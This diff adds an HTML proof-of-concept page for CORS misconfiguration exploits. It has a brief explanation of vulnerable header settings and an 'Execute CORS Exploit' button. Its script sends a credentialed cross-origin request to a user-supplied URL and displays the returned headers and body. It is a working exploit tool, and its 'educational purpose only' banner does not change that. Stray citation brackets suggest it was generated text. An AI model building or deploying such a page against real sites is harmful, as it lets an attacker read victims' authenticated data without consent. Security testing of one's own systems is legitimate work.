@@ -1,0 +1,139 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CORS Vulnerability Demo</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            max-width: 800px;
+            margin: 50px auto;
+            padding: 20px;
+            background-color: #f5f5f5;
+        }
+        .container {
+            background-color: white;
+            padding: 30px;
+            border-radius: 8px;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+        }
+        input[type="url"] {
+            width: 100%;
+            padding: 10px;
+            margin: 10px 0;
+            border: 1px solid #ddd;
+            border-radius: 4px;
+        }
+        button {
+            background-color: #dc3545;
+            color: white;
+            padding: 12px 24px;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+            font-size: 16px;
+        }
+        button:hover {
+            background-color: #c82333;
+        }
+        #result {
+            margin-top: 20px;
+            padding: 15px;
+            background-color: #f8f9fa;
+            border-left: 4px solid #007bff;
+            border-radius: 4px;
+            white-space: pre-wrap;
+            font-family: monospace;
+        }
+        .warning {
+            background-color: #fff3cd;
+            border: 1px solid #ffeaa7;
+            color: #856404;
+            padding: 15px;
+            border-radius: 4px;
+            margin-bottom: 20px;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>CORS Vulnerability Proof of Concept</h1>
+        
+        <div class="warning">
+            <strong>⚠️ Educational Purpose Only:</strong> This tool is designed for authorized security testing and educational purposes only. Always ensure you have proper authorization before testing any system[6].
+        </div>
+
+        <h2>How It Works</h2>
+        <p>This demonstration shows how misconfigured CORS policies can be exploited to access sensitive information from vulnerable websites by making cross-origin requests with credentials[4][6].</p>
+
+        <h3>Vulnerable CORS Configurations:</h3>
+        <ul>
+            <li><code>Access-Control-Allow-Origin: *</code> with <code>Access-Control-Allow-Credentials: true</code>[4]</li>
+            <li>Origin header reflection without proper validation[4][10]</li>
+            <li>Trusting null origins or wildcard configurations[1]</li>
+        </ul>
+
+        <h3>Test a Target URL</h3>
+        <label for="targetUrl">Enter the vulnerable URL (including protocol):</label>
+        <input type="url" id="targetUrl" placeholder="https://vulnerable-website.com/api/sensitive-data" required>
+        
+        <button onclick="exploitCORS()">Execute CORS Exploit</button>
+
+        <h3>Result:</h3>
+        <div id="result">No request sent yet...</div>
+    </div>
+
+    <script>
+        function exploitCORS() {
+            const targetUrl = document.getElementById('targetUrl').value;
+            const resultDiv = document.getElementById('result');
+            
+            if (!targetUrl) {
+                resultDiv.textContent = 'Please enter a target URL';
+                return;
+            }
+
+            resultDiv.textContent = 'Sending CORS request...';
+
+            // Create XMLHttpRequest to exploit CORS misconfiguration
+            const xhr = new XMLHttpRequest();
+            
+            xhr.onload = function() {
+                if (xhr.status === 200) {
+                    resultDiv.textContent = `SUCCESS: CORS vulnerability confirmed!\n\nResponse Headers:\n${xhr.getAllResponseHeaders()}\n\nResponse Body:\n${xhr.responseText}`;
+                } else {
+                    resultDiv.textContent = `Request completed with status: ${xhr.status}\n\nResponse: ${xhr.responseText}`;
+                }
+            };
+
+            xhr.onerror = function() {
+                resultDiv.textContent = 'CORS request blocked by browser - Target may not be vulnerable or may have proper CORS configuration';
+            };
+
+            xhr.ontimeout = function() {
+                resultDiv.textContent = 'Request timed out';
+            };
+
+            // Configure the request
+            xhr.open('GET', targetUrl, true);
+            xhr.withCredentials = true; // Include cookies and authentication
+            xhr.timeout = 10000; // 10 second timeout
+            
+            // Send the request
+            try {
+                xhr.send();
+            } catch (error) {
+                resultDiv.textContent = `Error sending request: ${error.message}`;
+            }
+        }
+
+        // Add Enter key support
+        document.getElementById('targetUrl').addEventListener('keypress', function(e) {
+            if (e.key === 'Enter') {
+                exploitCORS();
+            }
+        });
+    </script>
+</body>
+</html>
